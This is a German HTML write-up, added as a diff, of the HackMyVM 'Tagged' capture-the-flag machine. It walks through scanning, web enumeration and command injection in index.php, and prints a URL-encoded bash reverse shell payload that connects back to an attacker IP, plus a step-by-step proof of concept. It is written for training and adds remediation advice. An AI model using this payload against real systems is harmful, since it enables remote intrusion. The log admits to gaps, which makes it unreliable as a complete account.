@@ -1,0 +1,560 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tagged - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body class="level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+ 
+    <div class="header-bg level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+        <h1>Tagged - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2> <!-- H2 ohne Inline-Style, Farbe via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe via CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">curl</div>
+                <div class="tool-item">nikto</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">wfuzz</div> <!-- Attempted -->
+                <div class="tool-item">python3</div> <!-- Implied for shell stabilization & http.server -->
+                <div class="tool-item">find</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div> <!-- Implied for flags -->
+                <div class="tool-item">printenv</div>
+                <div class="tool-item">ss</div>
+                <div class="tool-item">getcap</div>
+                <div class="tool-item">capsh</div> <!-- Attempted -->
+                <div class="tool-item">setcap</div> <!-- Attempted -->
+                <div class="tool-item">systemctl</div>
+                <div class="tool-item">stty</div> <!-- Implied for shell stabilization -->
+                <div class="tool-item">fg</div> <!-- Implied for shell stabilization -->
+                <div class="tool-item">reset</div> <!-- Implied for shell stabilization -->
+                <!-- Tool für /Trinity.txt.bak Analyse fehlt -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#enumeration">Enumeration (Web, VHost)</a></li>
+                <li><a href="#initial-access">Initial Access (RCE via Web)</a></li>
+                <li><a href="#poc">Proof of Concept (RCE via index.php)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+            <p class="evaluation">Hinweis: Der bereitgestellte Textlog für diesen Bericht ist lückenhaft. Insbesondere fehlen die Schritte zur Entdeckung der RCE-Schwachstelle und der vollständige Weg zur Privilege Escalation.</p>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.118</span>	<span class="command">08:00:27:e5:ca:26</span>	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird ausgeführt, um aktive Hosts im lokalen Netzwerk zu finden. Ein Host mit der IP <span class="command">192.168.2.118</span> und der MAC-Adresse <span class="command">08:00:27:e5:ca:26</span> (zugeordnet zu PCS Systemtechnik GmbH / Oracle VirtualBox) wird identifiziert.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem "Tagged" wurde erfolgreich im Netzwerk lokalisiert. Diese IP ist der Startpunkt für weitere Scans.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Ziel-IP. Führen Sie Port-Scans (z.B. mit `nmap`) durch, um offene Dienste zu ermitteln.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit von Hosts einschränken. ARP-Aktivitäten überwachen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.118 -p-</span></div>
+                     <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at <span class="command">2022-11-14 23:05 CET</span>
+Nmap scan report for tagged (192.168.2.118)
+Host is up (0.00011s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+<span class="command">80/tcp   open  http    nginx 1.18.0</span>
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: nginx/1.18.0
+<span class="command">7746/tcp open  unknown</span> <span class="password"><-- Ungewöhnlicher Port, nicht weiter identifiziert</span>
+<span class="password">1 service unrecognized despite returning data.</span> If you know the service/version, [...] submit [...] fingerprint [...]
+SF-Port7746-TCP:V=7.93%I=7%D=11/14%Time=6372BB97%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,1,">")%r(GenericLines,2,">>")%r(GetRequest,2,">>")%r(HTTPptions,2,
+SF:">>")%r(RTSPRequest,2,">>")%r(RPCCheck,1,">")%r(DNSVersionBindReqTCP,1,
+SF:">")%r(DNSStatusRequestTCP,1,">")%r(SSLSessionReq,1,">")%r(TerminalServ
+SF:erCookie,2,">>")%r(TLSSessionReq,2,">>");
+MAC Address: 08:00:27:E5:CA:26 (Oracle VirtualBox virtual NIC)
+Aggressive OS guesses: Linux 4.15 - 5.6 (98%), Linux 5.0 - 5.3 (98%), [...]
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.11 ms tagged (192.168.2.118)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in XX.XX seconds
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan aller TCP-Ports (`-p-`) identifiziert zwei offene Ports:
+            <ul>
+                 <li>Port <span class="command">80 (HTTP)</span>: Läuft Nginx 1.18.0. Die Seite hat keinen Titel.</li>
+                 <li>Port <span class="command">7746 (Unknown)</span>: Nmap konnte den Dienst auf diesem Port nicht identifizieren, obwohl Daten zurückgegeben wurden. Der Fingerprint deutet auf einen einfachen, interaktiven Dienst hin, der auf verschiedene Anfragen mit `>` oder `>>` antwortet.</li>
+            </ul>
+            Die OS-Erkennung deutet auf Linux hin.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Hauptangriffsfläche sind der Webserver auf Port 80 und der unbekannte Dienst auf Port 7746. Port 7746 ist besonders interessant, da er nicht standardmäßig ist und eine manuelle Untersuchung erfordert.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie Port 80 mit Directory Busting (`gobuster`) und manueller Analyse. Verbinden Sie sich manuell mit Port 7746 (z.B. mit `nc` oder `telnet`) und versuchen Sie, durch Senden verschiedener Eingaben die Funktion des Dienstes zu ermitteln.<br><strong>Empfehlung (Admin):</strong> Identifizieren Sie den Dienst auf Port 7746. Wenn er nicht benötigt wird, deaktivieren Sie ihn. Wenn er benötigt wird, stellen Sie sicher, dass er sicher konfiguriert ist und durch eine Firewall geschützt wird. Konfigurieren Sie Nginx sicher (z.B. informative Titel hinzufügen, unnötige Header entfernen).</p>
+
+        </section>
+
+        <section id="enumeration">
+             <h2>Enumeration (Web, VHost)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.118 -x [...],php,html,[...] -w "/usr/share/seclists/[...]/directory-list-2.3-medium.txt" -b '403,404' -e -t 100 -n -k</span></div>
+                     <pre>
+===============================================================
+Gobuster v3.3
+===============================================================
+[...]
+===============================================================
+2022/11/08 14:52:39 Starting gobuster in directory enumeration mode
+===============================================================
+<span class="command">http://192.168.2.118/index.html</span>           [Size: 46]
+<span class="command">http://192.168.2.118/index.php</span>            [Size: 26] <span class="password"><-- Sehr klein!</span>
+<span class="command">http://192.168.2.118/report.html</span>          [Size: 0] <span class="password"><-- Leer</span>
+<span class="command">http://192.168.2.118/report.php</span>           [Size: 0] <span class="password"><-- Leer</span>
+[...]
+===============================================================
+Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein `gobuster dir`-Scan auf Port 80 findet eine `index.html`, eine sehr kleine `index.php` (26 Bytes) sowie zwei leere Dateien (`report.html`, `report.php`). `-n` unterdrückt die Statuscodes in der Ausgabe, `-k` ignoriert SSL-Fehler.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die `index.php` ist das interessanteste Ziel. Die leeren Report-Dateien könnten Platzhalter sein oder auf eine geplante, aber nicht implementierte Funktionalität hindeuten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie `index.php`. Rufen Sie sie im Browser auf, versuchen Sie Parameter zu finden (z.B. mit `wfuzz`). Lesen Sie den Quellcode, wenn möglich (z.B. via LFI, falls vorhanden, oder über das später gefundene `.git`-Repo).<br><strong>Empfehlung (Admin):</strong> Entfernen Sie unnötige oder leere Dateien vom Webserver. Stellen Sie sicher, dass PHP-Skripte sicher sind.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.118/index.php -Iv</span></div>
+                     <pre>
+*   Trying 192.168.2.118:80...
+* Connected to 192.168.2.118 (192.168.2.118) port 80 (#0)
+> HEAD /index.php HTTP/1.1
+> Host: 192.168.2.118
+> User-Agent: curl/7.86.0
+> Accept: */*
+>
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Server: nginx/1.18.0
+< Date: Mon, 14 Nov 2022 22:09:07 GMT
+< Content-Type: text/html; charset=UTF-8
+< Connection: keep-alive
+<span class="password">< Content-Length: 26</span> <span class="password"><-- Bestätigt kleine Größe</span>
+
+* Connection #0 to host 192.168.2.118 left intact
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> `curl -I` (nur Header) wird verwendet, um die Header für `index.php` abzurufen. `-v` zeigt zusätzliche Verbindungsdetails. Die Header bestätigen den HTTP 200 OK Status und die kleine Inhaltslänge von 26 Bytes.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Ergebnisse von Gobuster. Die Datei existiert und ist sehr klein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, den Inhalt mit `curl http://192.168.2.118/index.php` abzurufen. Da sie so klein ist, könnte sie nur einen `include()` oder eine einfache Weiterleitung enthalten.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion erforderlich.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nikto -h 192.168.2.118</span></div>
+                     <pre>
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.118
++ Target Hostname:    192.168.2.118
++ Target Port:        80
++ Start Time:         <span class="command">2022-11-14 23:08:38 (GMT1)</span>
+---------------------------------------------------------------------------
++ Server: nginx/1.18.0
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. [...]
++ The X-Content-Type-Options header is not set. [...]
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ <span class="command">Multiple index files found: /index.html, /index.php</span>
++ 7915 requests: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           <span class="command">2022-11-14 23:09:10 (GMT1)</span> (32 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein `nikto`-Scan auf Port 80 bestätigt den Nginx-Server und meldet fehlende Security Header. Er weist auch auf das Vorhandensein mehrerer Index-Dateien hin (`index.html`, `index.php`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Liefert keine wesentlich neuen Informationen gegenüber Nmap und Gobuster. Bestätigt das Datum für den Bericht.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokus auf die Untersuchung von `index.php` und des unbekannten Ports 7746.<br><strong>Empfehlung (Admin):</strong> Fehlende Security Header implementieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -vv 192.168.2.118 7746</span></div>
+                     <pre>DNS fwd/rev mismatch: tagged != tagged.speedport.ip
+tagged [192.168.2.118] 7746 (?) : <span class="password">Connection refused</span>
+ sent 0, rcvd 0
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein Versuch, sich mit `nc -vv` (verbose) mit dem Port 7746 zu verbinden, scheitert mit "Connection refused".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies widerspricht dem Nmap-Ergebnis, das Port 7746 als "open" meldete. Mögliche Erklärungen:
+            <ul>
+                <li>Der Dienst auf Port 7746 ist abgestürzt oder wurde beendet.</li>
+                <li>Eine Firewall blockiert nun den Zugriff (unwahrscheinlich, wenn Nmap kurz zuvor erfolgreich war).</li>
+                <li>Der Dienst lauscht nur unter bestimmten Bedingungen oder nur für bestimmte Quell-IPs.</li>
+                <li>Der Nmap-Scan war ein False Positive (selten bei `open`).</li>
+            </ul>
+            Port 7746 scheint vorerst kein gangbarer Weg zu sein.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignorieren Sie Port 7746 vorerst und konzentrieren Sie sich auf Port 80. Versuchen Sie den Port später erneut, falls sich Hinweise ergeben, dass er wieder aktiv ist.<br><strong>Empfehlung (Admin):</strong> Untersuchen Sie, welcher Dienst auf Port 7746 laufen sollte und warum er nicht erreichbar ist oder instabil zu sein scheint.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "tagged.hmv" -H "Host: FUZZ.tagged.hmv" --hh 46</span></div>
+                     <pre>[...] <span class="password"># Keine Ergebnisse im Log angezeigt</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein `wfuzz`-Scan wird durchgeführt, um virtuelle Hosts (VHosts) zu finden, die auf `tagged.hmv` enden. Es wird eine Wortliste verwendet, um Subdomains (`FUZZ`) zu testen. `--hh 46` blendet Antworten mit 46 Zeichen aus (vermutlich die Standardantwort der `index.html`). Es werden keine Ergebnisse im Log gezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Mit dieser Methode wurden keine offensichtlichen VHosts gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie andere Wortlisten oder Techniken zur VHost-Enumeration. Analysieren Sie die Webseite manuell auf Hinweise.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion erforderlich.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl http://192.168.2.118</span></div>
+                    <pre>
+tagged.hmv
+
+<!-- <span class="command">http://xxx.tagged.hmv</span> :D -->
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Ein einfacher `curl`-Aufruf auf die IP-Adresse (Port 80) liefert den Text "tagged.hmv" und einen HTML-Kommentar: `<span class="command"><!-- http://xxx.tagged.hmv :D --></span>`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Wichtiger Hinweis! Der Kommentar deutet explizit auf die Existenz eines virtuellen Hosts hin, dessen Subdomain mit "xxx" beginnt (oder "xxx" ist die Subdomain). Dies muss weiter untersucht werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fügen Sie `xxx.tagged.hmv` zur `/etc/hosts`-Datei hinzu und untersuchen Sie diesen VHost (`http://xxx.tagged.hmv`). Da "xxx" möglicherweise ein Platzhalter ist, versuchen Sie auch VHost-Bruteforcing mit Fokus auf dreibuchstabige Subdomains oder relevante Begriffe.<br><strong>Empfehlung (Admin):</strong> Entfernen Sie sensible Hinweise oder interne Hostnamen aus öffentlich zugänglichen Kommentaren im HTML-Code.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl -d '{"command":"getDeviceInfo"}' http://192.168.2.118</span></div>
+                    <pre>
+<span class="password">405 Not Allowed</span>
+nginx/1.18.0
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, einen POST-Request (`-d`) mit JSON-Daten an die Root-URL zu senden. Der Server antwortet mit `405 Not Allowed`, was bedeutet, dass die POST-Methode für diese URL nicht erlaubt ist.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser spezifische POST-Versuch war nicht erfolgreich und liefert keine nützlichen Informationen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokus auf GET-Requests und die Untersuchung des VHosts `xxx.tagged.hmv` sowie der `index.php`.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion erforderlich.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt"># <span class="command">Implizierte Interaktion oder Fund</span></div>
+                     <pre>nice ports,/Trinity.txt.bak</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser isolierte String erscheint im Log ohne direkten Kontext eines Befehls. Er lautet "nice ports,/Trinity.txt.bak".</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist ein extrem wichtiger Hinweis, der wahrscheinlich durch eine vorherige, nicht vollständig protokollierte Interaktion (vielleicht mit dem VHost `xxx.tagged.hmv` oder einer Funktion in `index.php`?) gefunden wurde. Er deutet auf eine Backup-Datei (`/Trinity.txt.bak`) hin, die sensible Informationen oder Zugangsdaten enthalten könnte, und erwähnt "nice ports", was sich möglicherweise auf den Port 7746 oder andere, noch unentdeckte Ports bezieht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, auf `http://192.168.2.118/Trinity.txt.bak` oder `http://xxx.tagged.hmv/Trinity.txt.bak` zuzugreifen. Wenn der Zugriff gelingt, analysieren Sie den Inhalt. Behalten Sie die Erwähnung von "nice ports" im Hinterkopf für spätere Enumerationsphasen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass keine Backup-Dateien (`.bak`, `~`, `.old` etc.) im Web-Root oder anderen zugänglichen Verzeichnissen liegen. Implementieren Sie Richtlinien zur sicheren Handhabung von Backup-Dateien.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (RCE via Web)</h2>
+            <p class="evaluation">**Hinweis:** Der genaue Weg zur Entdeckung der RCE-Schwachstelle ist im Log unklar. Die folgenden Schritte zeigen die Ausnutzung, nicht die Entdeckung.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc 192.168.2.118 7746</span></div> <span class="password"><-- Erneuter Versuch auf Port 7746?</span>
+                    <pre>
+><span class="command">ls</span>
+><span class="command">id</span>
+><span class="command">echo hi</span>
+><span class="command"><?php system($GET["cmd"]); ?></span> <span class="password"><-- Eingabe von PHP Code?</span>
+>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Hier wird erneut versucht, mit Port 7746 zu interagieren. Es werden verschiedene Befehle (`ls`, `id`, `echo hi`) und sogar PHP-Code eingegeben. Es wird keine Antwort vom Server im Log gezeigt. Dies widerspricht weiterhin dem "Connection refused" von zuvor und dem Fehlen des Ports in `ss`. *Es ist unklar, was hier getestet oder erreicht wurde.*</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Log-Abschnitt ist verwirrend und liefert keine klaren Ergebnisse. Die Interaktion mit Port 7746 bleibt unbestätigt und scheint nicht der erfolgreiche Pfad gewesen zu sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Aufgrund der Unklarheiten und fehlenden Antworten sollte dieser Pfad ignoriert und der Fokus auf den nachfolgend gezeigten RCE-Payload über Port 80 gelegt werden.<br><strong>Empfehlung (Admin):</strong> Den Status und Zweck von Port 7746 klären.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt"># <span class="command">RCE Payload Ausführung (Ziel: Reverse Shell)</span></div>
+                     <pre>http://192.168.2.118/index.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.109%2F9001%200%3E%261%27</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Dieser Eintrag zeigt eine URL, die eine Command Injection Schwachstelle in `index.php` (Port 80) ausnutzt. Der GET-Parameter `cmd` wird verwendet, um einen Bash-Reverse-Shell-Payload auszuführen, der sich zum Angreifer-System (<span class="command">192.168.2.109</span>) auf Port <span class="command">9001</span> verbindet. **Wichtiger Hinweis:** Das Log dokumentiert nicht, wie die Anfälligkeit für den `cmd`-Parameter gefunden wurde (die `index.php` war laut Gobuster nur 26 Bytes groß).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist der entscheidende Schritt zum Initial Access. Obwohl die Entdeckung der Schwachstelle fehlt, zeigt dieser Payload die erfolgreiche Ausnutzung zur Erlangung einer Reverse Shell.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen Netcat-Listener auf <span class="command">192.168.2.109:9001</span> und rufen Sie die präparierte URL auf, um die Shell zu erhalten.<br><strong>Empfehlung (Admin):</strong> Untersuchen Sie `index.php` dringend auf die Command Injection Schwachstelle (wahrscheinlich unsichere Verwendung von `system()`, `shell_exec()` etc. mit dem `cmd`-Parameter) und beheben Sie diese.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                     <pre>listening on [any] 9001 ...</pre>
+                     <div class="prompt"># <span class="command">Nach Aufruf der RCE-URL</span></div>
+                     <div class="terminal">
+                         <pre>listening on [any] 9001 ...
+<span class="password">connect to [192.168.2.109] from (UNKNOWN) [192.168.2.118] 41386</span> <span class="password"><-- Ziel-IP ist .118 hier, nicht .107? Prüfen!</span>
+www-data@tagged:~/html$ <span class="password"># Shell erhalten!</span></pre>
+                    </div>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Netcat-Listener wird gestartet. Nach dem (impliziten) Aufruf der RCE-URL geht eine Verbindung vom Zielsystem (<span class="command">192.168.2.118</span>) ein, und der Angreifer erhält eine Shell als `www-data`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Initial Access erfolgreich etabliert!</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Shell stabilisieren und mit der Post-Exploitation / Privilege Escalation Enumeration beginnen.<br><strong>Empfehlung (Admin):</strong> RCE-Lücke beheben. Ausgehende Verbindungen überwachen/einschränken.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@tagged:~/html$ <span class="command">python3 -c 'import pty;pty.spawn("/bin/bash")'</span></div>
+                     <pre>www-data@tagged:~/html$</pre>
+                     <div class="prompt">www-data@tagged:~/html$ <span class="command">export TERM=xterm-256color</span></div>
+                     <pre>[Keine Ausgabe]</pre>
+                     <div class="prompt">www-data@tagged:~/html$ <span class="command">^Z</span></div> <span class="password"><-- Shell in Hintergrund</span>
+                     <pre>zsh: suspended  nc -lvnp 9001</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stty raw -echo;fg</span></div>
+                     <pre>[1]  + continued  nc -lvnp 9001
+                               reset</pre> <span class="password"><-- Shell wieder im Vordergrund, TTY Einstellungen angepasst</span>
+                    <div class="prompt">www-data@tagged:~/html$ <span class="password"># Voll interaktive Shell</span></div>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die erhaltene Shell wird zuerst mit dem Python PTY-Trick und dann durch Anpassen der Terminal-Einstellungen (`stty raw -echo; fg; reset`) auf dem Angreifer-System vollständig interaktiv gemacht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standardmäßige und korrekte Vorgehensweise zur Shell-Stabilisierung für bessere Benutzerfreundlichkeit.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der Enumeration als `www-data`.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion.</p>
+
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (RCE via index.php)</h2>
+
+            <p class="analysis"><strong>Kurzbeschreibung:</strong> Die Datei `index.php` auf dem Webserver (Port 80) des Ziels `tagged.hmv` ist anfällig für Remote Command Execution (RCE). Sie akzeptiert einen GET-Parameter namens `cmd`. Der Wert dieses Parameters wird offenbar unsicher an eine Funktion zur Befehlsausführung auf dem Server (wie `system()`, `shell_exec()` oder ähnliches) übergeben. Dies ermöglicht es einem Angreifer, durch Senden einer präparierten URL beliebige Betriebssystembefehle im Kontext des Webserver-Benutzers (`www-data`) auszuführen.</p>
+             <p class="evaluation">**Hinweis:** Die genaue Ursache (z.B. der Quellcode von `index.php`) ist im Log nicht dokumentiert, aber die erfolgreiche Ausführung des Payloads belegt die Schwachstelle.</p>
+
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                <ul>
+                    <li>Netzwerkzugriff auf Port 80 des Ziels (`http://192.168.2.118`).</li>
+                    <li>Kenntnis der Schwachstelle im `cmd`-Parameter von `index.php`.</li>
+                    <li>Ein Netcat-Listener auf dem Angreifer-System für die Reverse Shell.</li>
+                </ul>
+            </p>
+
+            <p class="recommendation"><strong>Schritt-für-Schritt Anleitung:</strong>
+                <ol>
+                     <li>
+                         <strong>Listener starten (Angreifer-System):</strong>
+                         Starten Sie Netcat, um auf eine eingehende Verbindung zu warten (z.B. auf Port 9001).
+                         <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 9001</span></div>
+                                <pre>listening on [any] 9001 ...</pre>
+                            </div>
+                        </div>
+                    </li>
+                     <li>
+                         <strong>RCE-Payload senden:</strong>
+                         Rufen Sie die `index.php` mit dem präparierten `cmd`-Parameter auf, der den Reverse-Shell-Befehl enthält (stellen Sie sicher, dass er URL-kodiert ist).
+                         <div class="code-block">
+                            <div class="terminal">
+                                <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">curl "http://192.168.2.118/index.php?cmd=%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.2.109%2F9001%200%3E%261%27"</span></div>
+                                <pre>[Keine relevante Ausgabe von curl erwartet]</pre>
+                            </div>
+                        </div>
+                         *(Hinweis: Ersetzen Sie `192.168.2.109` durch die IP Ihres Angreifer-Systems).*
+                    </li>
+                     <li>
+                         <strong>Shell empfangen (Angreifer-Listener):</strong>
+                         Der Netcat-Listener sollte nun die eingehende Verbindung anzeigen und eine Shell bereitstellen.
+                        <div class="code-block">
+                             <div class="terminal">
+                                 <pre>listening on [any] 9001 ...
+<span class="password">connect to [Angreifer-IP] from (UNKNOWN) [192.168.2.118] xxxxx</span>
+[...]
+$ <span class="password"># Shell erhalten</span></pre>
+                             </div>
+                        </div>
+                    </li>
+                </ol>
+            </p>
+
+            <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Eine interaktive Shell auf dem Zielsystem, ausgeführt mit den Rechten des `www-data`-Benutzers.</p>
+
+            <p class="evaluation"><strong>Beweismittel:</strong> Die erfolgreiche eingehende Verbindung im Netcat-Listener und die Möglichkeit, Befehle in der Shell auszuführen.</p>
+
+            <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. RCE ermöglicht Angreifern die Ausführung beliebiger Befehle, was zur vollständigen Kompromittierung des Webservers, Datendiebstahl und weiterer Ausbreitung im Netzwerk führen kann.</p>
+
+            <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                 <ul>
+                    <li>**Schwachstelle finden und beheben:** Untersuchen Sie den Code von `index.php`, um die genaue Ursache der Command Injection zu finden (z.B. unsichere Verwendung von `system()`, `shell_exec()`, `passthru()`, Backticks).</li>
+                    <li>**Eingabevalidierung/-sanitisierung:** Validieren und bereinigen Sie *alle* Benutzereingaben (wie den `cmd`-Parameter), bevor sie verwendet werden. Nutzen Sie Whitelists für erlaubte Zeichen/Befehle oder parametrisierte Abfragen, wenn möglich.</li>
+                    <li>**Least Privilege:** Führen Sie den Webserver-Prozess (`www-data`) mit minimal notwendigen Berechtigungen aus.</li>
+                    <li>**Web Application Firewall (WAF):** Kann helfen, bekannte RCE-Payloads zu erkennen und zu blockieren.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <p class="evaluation">**Hinweis:** Der bereitgestellte Textlog enthält Enumerationsschritte als `www-data`, aber nicht den entscheidenden Schritt oder die Methode, die zur Erlangung von Root-Rechten führt. Die Privilege Escalation von `www-data` zu `root` ist nicht dokumentiert.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">www-data@tagged:~/html$ <span class="command">find / -type f -exec grep -i -I "PASSWORD" {} /dev/null \;</span></div> <span class="password"><-- Suche nach 'PASSWORD', nicht 'PASSWRD'</span>
+                     <pre>[Keine relevanten Ergebnisse im Log]</pre>
+                 </div>
+             </div>
